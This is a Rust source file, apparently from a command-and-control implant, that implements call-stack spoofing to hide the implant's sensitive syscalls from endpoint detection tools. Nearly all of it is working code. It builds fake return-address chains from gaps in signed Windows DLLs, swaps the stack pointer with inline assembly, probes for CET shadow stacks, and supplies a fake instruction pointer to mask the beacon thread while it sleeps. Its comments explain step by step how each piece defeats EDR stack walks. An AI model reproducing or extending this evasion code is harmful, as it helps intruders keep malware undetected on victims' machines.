//! Call-stack spoofing — BYOUD-Gap / LACUNA-Chain class.
//!
//! ## Status (P2.1a-ii): frame-chain synthesis + fake-stack staging is REAL and
//! unit-verifiable; the syscall hot-path *hook point* is wired ([`set_gap_pool`]
//! + [`spoof_wrap`]); the RSP swap itself is gated behind a runtime switch and
//! defaults OFF until target-side live debugging + the CET-aware swap seam land.
//!
//! ## Why this matters
//! EDRs walk the call stack of a sensitive syscall (`NtOpenProcess`,
//! `NtAllocateVirtualMemory`, …) and flag a return address that doesn't live
//! inside a legit module — a bare indirect-syscall trampoline still *returns*
//! into implant memory. The current posture (Tier-0 indirect syscalls) makes
//! the executing `syscall` instruction's RIP legit (it lands inside ntdll), but
//! the **return address** is implant-allocated — that second half is what stack
//! spoofing closes.
//!
//! ## CET safety — runtime gate, not a repair seam
//!
//! The gap/leaf-bridge technique is CET-safe **at the stack-walk detection
//! layer**: EDR unwinders (`RtlVirtualUnwind` / `RtlLookupFunctionEntry`) treat
//! `.pdata`-gap addresses as leaf functions (RSP += 8, no shadow-stack touch),
//! so a chain of leaf gaps reads as a clean synthetic chain.
//!
//! At the `ret` **execution layer**, Intel CET shadow stacks fault (`#CP`) if
//! the popped return address doesn't match the shadow stack. A plain
//! `mov rsp / call / ret` swap would fault on CET-on hosts. **This module does
//! NOT attempt a `#CP` repair seam** (no `KiControlProtectionFault` /
//! `RtlRestoreContext` VEH). Instead, it uses a runtime `should_execute()` gate:
//! `cet_active()` (via `IsProcessorFeaturePresent(PF_SMET_CET_SHADOW_STACKS)`)
//! is probed at every call; when CET is detected, the swap degrades to a direct
//! `f()` call (no spoofing). On CET-off hosts the swap runs normally.
//!
//! ## Single-source-of-truth
//! The frame-chain *math* lives ONLY in `nyx-implant-evasionsdk::frame`
//! (`build_leaf_bridge`, 8 tests green). This module's job is to stage that
//! chain into a fake-stack region and (when enabled) swap RSP onto it around a
//! sensitive call. We never re-synthesize frames here.

#![cfg(target_os = "windows")]

use crate::heap::Vec;
use core::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use nyx_implant_evasionsdk::frame;
use nyx_implant_evasionsdk::GapPool;

/// How many leaf-gap bridge frames to stage per sensitive call. 8 is a robust
/// depth: an EDR stack walk typically inspects the first few frames before
/// deciding the stack is "legit"; a chain of 8 leaf gaps terminates the walk
/// well before it reaches implant-allocated memory.
const BRIDGE_DEPTH: usize = 8;

/// Master switch for the RSP swap. When armed (true), the BYOUD-Gap leaf-bridge
/// chain is staged at init and the swap executes on every syscall, making the
/// caller's return address resolve to a signed-DLL .pdata gap instead of an
/// implant address. **Auto-armed at bootstrap** on CET-off hosts with usable
/// `.pdata` gaps. On CET-on hosts the runtime `should_execute()` gate degrades
/// to a direct call (no spoofing). The static default is `false`, but
/// `entry::bootstrap()` calls `set_swap_enabled(true)` when
/// `swap::decide(cet_on, gaps_usable) == Execute`.
static SPOOF_SWAP_ENABLED: AtomicBool = AtomicBool::new(false);

/// Enable/disable the RSP swap at runtime. Call from a selftest or operator
/// command after target-side validation. The frame staging runs regardless.
pub fn set_swap_enabled(on: bool) {
    SPOOF_SWAP_ENABLED.store(on, Ordering::Release);
}

/// Whether the RSP swap is currently armed.
pub fn swap_enabled() -> bool {
    SPOOF_SWAP_ENABLED.load(Ordering::Acquire)
}

/// Pointer to a cached `GapPool` (installed once at init via [`set_gap_pool`]),
/// so the syscall hot path can stage a chain without threading a `&GapPool`
/// through every `syscallN` signature. `0` = not installed → spoof inert.
/// Stored as a raw usize because the pool is `'static`-leaked (process lifetime,
/// mirrors `GLOBAL_RT`'s leak pattern in `syscalls.rs`).
static GLOBAL_GAP_POOL: AtomicUsize = AtomicUsize::new(0);

/// Install a process-wide `GapPool` for the spoof hot path. Call once after
/// `PdataGapScanner::scan` succeeds at init. The pool is leaked (process
/// lifetime) exactly as the syscall `Runtime` is. After this, [`spoof_wrap`]
/// will stage chains; the swap still stays inert unless [`set_swap_enabled`] is
/// also armed.
///
/// # Safety
/// `pool` must point at a `'static` (leaked) `GapPool` that outlives the
/// process. Callers normally obtain it via `Box::leak(scanner.scan()?)`.
pub unsafe fn set_gap_pool(pool: &'static GapPool) {
    GLOBAL_GAP_POOL.store(pool as *const GapPool as usize, Ordering::Release);
}

/// Borrow the installed gap pool, if any.
fn global_gap_pool() -> Option<&'static GapPool> {
    let p = GLOBAL_GAP_POOL.load(Ordering::Acquire);
    if p == 0 {
        None
    } else {
        // SAFETY: installed by set_gap_pool from a 'static (leaked) GapPool.
        Some(unsafe { &*(p as *const GapPool) })
    }
}

/// Get a spoof RIP from the gap pool (first gap address). Used by the Foliage
/// APC chain to set the beacon thread's CONTEXT.RIP to a fake .pdata-gap address
/// during sleep — stack-walking detectors see a legitimate ntdll leaf, not the
/// implant. Returns None if the gap pool isn't populated.
pub fn gap_pool_rip() -> Option<u64> {
    global_gap_pool()
        .filter(|p| !p.gaps.is_empty())
        .map(|p| p.gaps[0] as u64)
}

/// A staged fake call-stack: the synthesized leaf-gap bridge chain, written
/// into an implant-owned buffer as a sequence of 8-byte return-address slots.
/// The innermost (most-recent) return address is at the lowest address, so the
/// unwinder walking `[RSP]`, `[RSP+8]`, … sees the chain in call order.
///
/// Producing this from a `GapPool` exercises the real `frame::build_leaf_bridge`
/// pipeline end-to-end (the pure core), making the spoof's data path verifiable
/// without touching RSP.
pub struct StagedChain {
    /// The fake-stack buffer: `slots[0]` == `[RSP]` (innermost). Each slot is a
    /// 64-bit absolute leaf-gap address drawn from `gaps`/`nops`/`ghosts`.
    slots: Vec<u64>,
}

impl StagedChain {
    /// Synthesize + stage a leaf-gap bridge chain of depth [`BRIDGE_DEPTH`]
    /// from `pool`, round-robining across the gap/nop/ghost buckets (one per
    /// round, skipping shorter pools) exactly as `frame::build_leaf_bridge`
    /// specifies. Returns `None` if the pool is empty (spoof unavailable).
    ///
    /// Pure data path: allocates the fake-stack buffer and writes the chain,
    /// but does NOT touch the live stack. Safe to call + inspect from a selftest.
    pub fn stage(pool: &GapPool) -> Option<Self> {
        let chain = frame::build_leaf_bridge(&pool.gaps, &pool.nops, &pool.ghosts, BRIDGE_DEPTH);
        if chain.is_empty() {
            return None;
        }
        let mut slots = Vec::with_capacity(chain.len());
        for f in &chain {
            // The chain's addrs are already absolute (PdataGapScanner promoted
            // RVAs to base+rva). Store as u64 return-address slots.
            slots.push(f.addr as u64);
        }
        Some(Self { slots })
    }

    /// Number of staged leaf-gap frames.
    pub fn depth(&self) -> usize {
        self.slots.len()
    }

    /// The staged return-address slots, `[RSP]` first. For inspection/selftest.
    pub fn slots(&self) -> &[u64] {
        &self.slots
    }

    /// True iff every staged slot is a valid leaf-gap address (non-zero and
    /// plausibly in a module range — a coarse sanity check; the real
    /// leaf-legal property is `RtlLookupFunctionEntry(addr) == NULL`, which
    /// only the kernel/unwinder can confirm at runtime).
    pub fn looks_valid(&self) -> bool {
        !self.slots.is_empty() && self.slots.iter().all(|&a| a != 0)
    }
}

/// Cache of the most-recently-staged chain, set by [`stage_for`] and read by
/// the (gated) swap path. Held at module scope so a selftest can inspect it
/// after a staging run without threading it through the call.
static LAST_STAGED_DEPTH: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);

/// Stage a chain from `pool` and record its depth for diagnostics. Returns the
/// staged chain (caller may inspect it); `None` if the pool yielded nothing.
pub fn stage_for(pool: &GapPool) -> Option<StagedChain> {
    let staged = StagedChain::stage(pool)?;
    LAST_STAGED_DEPTH.store(staged.depth(), Ordering::Release);
    Some(staged)
}

/// Depth of the most-recently-staged chain (0 if none staged yet).
pub fn last_staged_depth() -> usize {
    LAST_STAGED_DEPTH.load(Ordering::Acquire)
}

/// Hot-path hook point the syscall wrappers call. Stages a chain from the
/// installed global pool (if any) and — ONLY when [`swap_enabled`] is true and
/// the runtime CET gate (`should_execute`) allows — wraps `f` in the spoofed-stack scope.
///
/// With no pool installed OR the swap disabled (the default), this is a direct
/// call to `f` with zero staging overhead. When the pool is installed AND swap
/// is armed, the chain is staged and the RSP swap executes. This is the wiring
/// that makes the spoof *available* on the syscall hot path without changing
/// default beacon behavior.
///
/// # Safety
/// Same as [`with_spoofed_stack`]: the live RSP-swap path (when armed)
/// manipulates the stack pointer; callers treat `f` as running under unusual
/// stack conditions. With the swap disabled `f` runs normally.
pub unsafe fn spoof_wrap<T>(f: impl FnOnce() -> T) -> T
where
    T: Default,
{
    match global_gap_pool() {
        Some(pool) => unsafe { with_spoofed_stack(pool, f) },
        None => f(),
    }
}

/// Execute `f` with a spoofed call stack.
///
/// **P2.1a-ii current behavior**:
/// - When swap is disabled (the default), this is a direct call to `f` — no
///   staging, no allocator overhead. This is the hot path on every syscall.
/// - When swap is armed AND CET-off + gaps usable, the frame-chain synthesis +
///   fake-stack staging runs, then the actual RSP swap executes around `f`.
/// - With the swap off, `f` is called directly — byte-identical to the
///   pre-spoof behavior, so the beacon loop is never destabilized by an
///   unvalidated swap.
///
/// The contract (returns whatever `f` returns) is fixed so `syscalls::syscallN`
/// can wrap its trampoline invocation here without changing call sites when the
/// swap goes live.
///
/// # Safety
/// Marked unsafe because the live RSP-swap path (when enabled) manipulates the
/// stack pointer and return addresses; callers must treat `f` as running under
/// unusual stack conditions. With the swap disabled `f` runs normally.
pub unsafe fn with_spoofed_stack<T, F: FnOnce() -> T>(gaps: &GapPool, f: F) -> T
where
    T: Default,
{
    // Fast path: swap not armed — skip staging entirely and call f directly.
    // This avoids wasting allocator cycles on every syscall in the hot path
    // when the swap is disabled (the default, and permanently off on CET-active
    // hosts). The staging data path is still exercised via selftests that call
    // `stage_for` directly.
    if !swap_enabled() {
        return f();
    }
    // ---- SWAP ARMED: stage the chain, then check CET + gap usability ------
    let _staged = stage_for(gaps);
    // ---- LIVE RSP SWAP (gated + CET-aware) ---------------------------------
    // Consult the pure CET-aware decision logic (evasionsdk::swap, 5 tests):
    // if CET is on OR gaps unusable, the swap would #CP or be useless → degrade.
    let cet_on = cet_active();
    let gaps_usable = gaps.is_usable();
    if !nyx_implant_evasionsdk::swap::should_execute(cet_on, gaps_usable) {
        return f(); // Degrade — honor the decision.
    }
    // EXECUTE: CET off + gaps usable. Swap RSP onto the staged fake stack,
    // call f, restore RSP. The fake stack is a static buffer (no alloc on the
    // hot path). We store f's FnOnce in a static slot the trampoline reads,
    // because Rust inline asm can't call closures directly.
    match &_staged {
        Some(chain) if chain.depth() > 0 => unsafe { do_rsp_swap(chain, f) },
        _ => f(), // nothing staged — degrade
    }
}

/// Probe whether user-mode CET / shadow stack is active for this process.
/// Delegates to `version::cet_active()` which calls
/// `IsProcessorFeaturePresent(PF_CET = 41)`. Returns FALSE on Win10/Server 2019
/// (correct — CET didn't exist), TRUE on Win11 24H2+ if the process opted in.
fn cet_active() -> bool {
    crate::version::cet_active()
}

// ---- RSP swap execution (x86_64 inline asm) --------------------------------
//
// The swap works by:
//   1. Saving the real RSP.
//   2. Writing the staged chain slots into a fake-stack buffer.
//   3. Setting RSP to point at the fake stack (with 32-byte shadow space).
//   4. Calling f via a stored function pointer (the trampoline).
//   5. Restoring the real RSP after f returns.
//
// On CET-off hosts this is safe: the `ret` in f's epilogue pops the return
// address we placed on the fake stack (a gap address), which the unwinder
// treats as a leaf. On CET-on hosts, decide() returns Degrade before we get
// here, so this path is never taken with shadow stacks active.

/// Diagnostic flag: set true when the RSP-swap data path (chain staging) ran.
/// A selftest reads this to confirm the swap mechanics executed without panic,
/// even though the live `mov rsp` asm is now real and gated behind CET checks.
static SWAP_ATTEMPTED: AtomicBool = AtomicBool::new(false);

/// Read whether the RSP-swap data path was attempted (for selftest diagnostics).
pub fn swap_was_attempted() -> bool {
    SWAP_ATTEMPTED.load(Ordering::Acquire)
}

/// Execute the RSP swap. Writes the chain into a fake stack, swaps RSP, calls
/// `f` ON THE SPOOFED STACK via a concrete trampoline, then restores RSP.
///
/// # Safety
/// Caller guarantees CET off + gaps usable. `chain` must be valid.
#[cfg(target_arch = "x86_64")]
#[allow(unused_assignments)]
unsafe fn do_rsp_swap<T, F: FnOnce() -> T>(chain: &StagedChain, f: F) -> T
where
    T: Default,
{
    // Stage the fake stack (process-lifetime leak). Layout (stack grows DOWN,
    // low address → high): the fake stack needs room BELOW RSP for the nested
    // `call`s (trampoline → bridge → f → f's frame) + 32-byte shadow spaces,
    // AND the gap-spoof chain ABOVE [RSP] (so a stack-walk sees legit frames).
    // We use a 1024-u64 (8 KiB) buffer: the top half holds the chain, RSP sits
    // just below the chain so [RSP..] = chain + shadow, and ~4 KiB below RSP is
    // free for the call pushes. 8 KiB >> any plausible nested-call depth here
    // (the old 2 KiB / cap=256 left only ~1 KiB below RSP after depth-capping
    // at cap/2 = 128 u64 — too thin for deep nested Windows ABI frames).
    static FAKE_STACK: AtomicUsize = AtomicUsize::new(0);
    let cap = 1024usize;
    let buf_ptr = FAKE_STACK.load(Ordering::Acquire);
    let buf: *mut u64 = if buf_ptr != 0 {
        buf_ptr as *mut u64
    } else {
        let mut v = crate::heap::Vec::<u64>::with_capacity(cap);
        while v.len() < cap {
            v.push(0);
        }
        let ptr = v.as_mut_ptr();
        core::mem::forget(v);
        FAKE_STACK.store(ptr as usize, Ordering::Release);
        ptr
    };
    // Write the gap-spoof chain at the TOP of the buffer: buf[cap-1] down to
    // buf[cap-1-depth]. RSP points at the chain's low end (so [RSP] = first
    // gap = the "return address" a stack-walk sees, with the rest of the chain
    // above it). Room below RSP = (cap - depth) u64 for pushes.
    let depth = chain.slots().len().min(cap / 2);
    unsafe {
        for (i, &slot) in chain.slots().iter().take(cap / 2).enumerate() {
            // chain[0] (outermost) at the highest slot; chain[last] at RSP.
            // [RSP] must be the LAST-queued frame (innermost) for a walk.
            // Place slots so buf[rsp_idx + i] = chain[i], rsp_idx = cap/2 - depth.
            let rsp_idx = cap / 2 - depth;
            *buf.add(rsp_idx + i) = slot;
        }
    }

    // Reset the "trampoline ran" flag for THIS invocation. run_f_on_spoof sets
    // it true the instant it ptr::reads f (taking ownership of f's env). We use
    // it below to decide whether to forget(f) (f consumed) vs drop(f) (f still
    // live because the asm faulted before the bridge ran) and whether `out` is
    // initialized. Cleared here so a stale true from a prior call can't mislead.
    SWAP_DONE.store(false, Ordering::Release);
    // Mark that the swap was attempted (diagnostic: a selftest can read this).
    SWAP_ATTEMPTED.store(true, Ordering::Release);

    // Reentrancy guard: if another swap is in flight (shouldn't happen under
    // the single-beacon-thread invariant, but belt-and-suspenders), degrade.
    if SWAP_IN_FLIGHT
        .compare_exchange(false, true, Ordering::AcqRel, Ordering::Acquire)
        .is_err()
    {
        return f();
    }

    // ---- THE mov rsp EXECUTION (Task F) -------------------------------------
    //
    // f now runs ON THE SPOOFED STACK. The trick that lets a generic f cross
    // the asm boundary: `asm! sym` can only call a CONCRETE fn, so we `call` a
    // concrete trampoline (`spoof_trampoline`) that reads f (as an erased fn
    // pointer) + the out-slot address from per-call statics, invokes f, and
    // writes T into the caller's MaybeUninit<T>. The single-beacon-thread
    // invariant makes the statics safe (no concurrent callers).
    //
    // CET safety (module docs layer 2): this path is only reached after
    // `should_execute(cet_on, ...)` in with_spoofed_stack returned Execute — i.e.
    // CET is OFF on this host. On a CET-on host the gap-chain `ret`s would #CP,
    // but decide() already degrades before we get here. The blind `mov rsp /
    // call / ret` is therefore safe on the guarded path.

    use core::mem::MaybeUninit;
    let mut out: MaybeUninit<T> = MaybeUninit::uninit();
    let out_addr = out.as_mut_ptr() as usize;

    // Store the erased f + out-slot for the trampoline. f's exact closure type
    // is anonymous (impl FnOnce), but within THIS monomorphization of
    // do_rsp_swap<T> it is fixed — so we pass it to a <T, F> bridge whose F is
    // inferred here. The bridge reads f by raw pointer + writes T to out.
    SWAP_FN.store(
        run_f_on_spoof::<T, F> as *const () as usize,
        Ordering::Release,
    );
    SWAP_F.store(
        core::ptr::addr_of!(f) as *const () as usize,
        Ordering::Release,
    );
    SWAP_OUT.store(out_addr, Ordering::Release);

    // fake_rsp: the low end of the chain (so [RSP] = innermost gap frame).
    // (cap/2 - depth) u64 from buf; plenty of room below for nested pushes.
    // CRITICAL: x64 ABI requires RSP 16-byte aligned at the `call` site. The
    // trampoline/bridge are compiled Rust fns whose prologue may use `movaps`
    // (requires 16-byte alignment) — a misaligned fake RSP → STATUS_ACCESS_
    // VIOLATION (0xC0000005) inside the called fn. We mask down to 16 bytes.
    let rsp_idx = cap / 2 - depth;
    let mut fake_rsp = unsafe { buf.add(rsp_idx) } as usize;
    fake_rsp &= !0xFusize; // round DOWN to 16-byte alignment
    #[allow(unused_assignments, unused_variables)]
    let mut save_rsp: usize;
    let fake_in = fake_rsp;

    // The swap: save real RSP → load spoofed RSP → call trampoline (f runs on
    // the spoofed stack) → restore real RSP. The trampoline's `ret` returns to
    // the instruction after `call` HERE (real RSP is restored right after).
    // NOTE: NO `options(nostack)` — this asm deliberately manipulates RSP, so
    // we must let the compiler treat the stack as clobbered (it would otherwise
    // assume RSP is stable across the block and reuse save_rsp's register,
    // corrupting the restore). We also clobber the volatile registers the call
    // may trash + the flags.
    unsafe {
        core::arch::asm!(
            "mov {save}, rsp",        // 1. save real RSP
            "mov rsp, {fake}",        // 2. swap onto the spoofed (gap) stack
            "call {tramp}",           // 3. trampoline → f (on spoofed RSP)
            "mov rsp, {save}",        // 4. restore real RSP
            save = out(reg) save_rsp,
            fake = in(reg) fake_in,
            tramp = sym spoof_trampoline,
            out("rax") _,
            out("rcx") _,
            out("rdx") _,
            out("r8") _,
            out("r9") _,
            out("r10") _,
            out("r11") _,
        );
    }

    // Clear the per-call statics (release the reentrancy guard last so a
    // concurrent caller can't observe a half-torn-down slot set).
    SWAP_FN.store(0, Ordering::Release);
    SWAP_F.store(0, Ordering::Release);
    SWAP_OUT.store(0, Ordering::Release);
    SWAP_IN_FLIGHT.store(false, Ordering::Release);

    // Decide ownership + init state from whether the trampoline actually ran.
    // SWAP_DONE is set inside run_f_on_spoof at the exact instant it ptr::reads
    // f — i.e. ownership of f's captured env has MOVED OUT of the &f slot.
    let done = SWAP_DONE.load(Ordering::Acquire);

    if done {
        // SAFETY: the bridge ptr::read f (consuming it) and, because panic =
        // "abort", either completed f() + wrote `out` before returning, or
        // aborted the process (in which case we never reach here). So reaching
        // this point with done == true implies `out` was written exactly once
        // with a valid T. f itself is already consumed — forget its now-moved
        // shell to avoid a double-drop of its captured env.
        core::mem::forget(f);
        SWAP_DONE.store(false, Ordering::Release);
        out.assume_init()
    } else {
        // The asm raised before the bridge took ownership of f (e.g. a misaligned
        // fake RSP, or a gap-chain ret into an unmapped address that a VEH or
        // debugger swallowed). f is STILL LIVE in its slot — drop it normally so
        // its captured env is NOT leaked (this is the leak half of CRITICAL-8:
        // the old code unconditionally forgot(f), leaking f's env on this path).
        // `out` was never written, so we must NOT assume_init it (reading uninit
        // memory is UB — the other half of CRITICAL-8). Instead we return
        // T::default(): sound for the status-code T (u32 NTSTATUS, where 0 is a
        // benign degraded value) actually used at the syscall seam. The T: Default
        // bound on do_rsp_swap / with_spoofed_stack / spoof_wrap enforces this.
        drop(f);
        SWAP_DONE.store(false, Ordering::Release);
        T::default()
    }
}

// ---- per-call statics for the spoofed-stack trampoline (single beacon thread) ----
/// Reentrancy guard: prevents concurrent use of the per-call statics. A CAS
/// from 0→1 at entry and store(0) at exit. ~1 ns per call.
static SWAP_IN_FLIGHT: AtomicBool = AtomicBool::new(false);
/// Set true by [`run_f_on_spoof`] at the instant it `ptr::read`s f — i.e. the
/// moment ownership of f's captured environment has moved OUT of the caller's
/// `&f` slot into the bridge's local. Read by [`do_rsp_swap`] after the asm
/// block to decide: (a) whether to `forget(f)` (f consumed → don't double-drop)
/// vs `drop(f)` (asm faulted before the bridge ran → f still live, must not
/// leak), and (b) whether `out` was written (only `assume_init` if so). This
/// closes CRITICAL-8: the unconditional `forget(f)` + unconditional
/// `assume_init` were UB on the asm-faulted-before-bridge path.
static SWAP_DONE: AtomicBool = AtomicBool::new(false);
static SWAP_FN: AtomicUsize = AtomicUsize::new(0); // erased run_f_on_spoof::<T> ptr
static SWAP_F: AtomicUsize = AtomicUsize::new(0); // &f as *const ()
static SWAP_OUT: AtomicUsize = AtomicUsize::new(0); // *mut T out-slot

/// Concrete (non-generic) trampoline called by the `asm!` `call`. RSP is the
/// spoofed stack here. It reads the per-T `run_f_on_spoof::<T>` fn pointer +
/// the f/out pointers from the statics and invokes it — f runs on this spoofed
/// RSP, writes T to the out-slot, returns. Non-generic → valid asm `sym`.
///
/// # Safety
/// Only invoked from do_rsp_swap after the statics are populated.
unsafe extern "C" fn spoof_trampoline() {
    let run = SWAP_FN.load(Ordering::Acquire) as *mut u8;
    let f_ptr = SWAP_F.load(Ordering::Acquire) as *mut u8;
    let out_ptr = SWAP_OUT.load(Ordering::Acquire) as *mut u8;
    if run.is_null() {
        return;
    }
    // run_f_on_spoof::<T> is an unsafe extern "C" fn(*mut u8 f, *mut u8 out).
    // We stored it as a 2-arg fn; call via a typed fn pointer.
    type Bridge = unsafe extern "C" fn(*mut u8, *mut u8);
    let bridge: Bridge = unsafe { core::mem::transmute(run) };
    unsafe { bridge(f_ptr, out_ptr) };
}

/// The per-<T, F> monomorphized bridge: reads `f` (the closure, by raw pointer)
/// + writes f's result into `out`. One concrete symbol per (T, F) → storable in
/// SWAP_FN + callable from the non-generic trampoline. The `f` pointer here is
/// `addr_of!(f)` from do_rsp_swap (it borrows the original moved-in closure);
/// we read it out by ptr::read (consuming it) and run it once.
///
/// # Safety
/// `f_ptr` must point at a valid `F` (the closure) that the caller moved in;
/// `out_ptr` must point at an uninitialized `T`. Both used exactly once.
unsafe extern "C" fn run_f_on_spoof<T, F: FnOnce() -> T>(f_ptr: *mut u8, out_ptr: *mut u8) {
    // SAFETY: f_ptr is `addr_of!(f)` from do_rsp_swap, pointing at a valid,
    // caller-moved-in F. ptr::read transfers ownership of f's captured env out
    // of the caller's slot into this local; the caller will forget(f) to avoid
    // a double-drop. We set SWAP_DONE BEFORE invoking f so that even if f itself
    // faults in a way a VEH recovers from (rather than aborting), the caller
    // knows ownership has moved and `out` may have been written.
    let f: F = unsafe { core::ptr::read(f_ptr as *mut F) };
    SWAP_DONE.store(true, Ordering::Release);
    let result: T = f();
    // SAFETY: out_ptr is the MaybeUninit<T> out-slot from do_rsp_swap; we hold
    // exclusive write access for the duration of the bridge. Writing here is the
    // single initialization of `out` — the caller only assume_init's when
    // SWAP_DONE is true and the bridge returned (which, under panic = "abort",
    // means this write executed).
    unsafe { core::ptr::write(out_ptr as *mut T, result) };
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn do_rsp_swap<T, F: FnOnce() -> T>(_chain: &StagedChain, f: F) -> T
where
    T: Default,
{
    f() // non-x86_64: no RSP swap, call directly
}
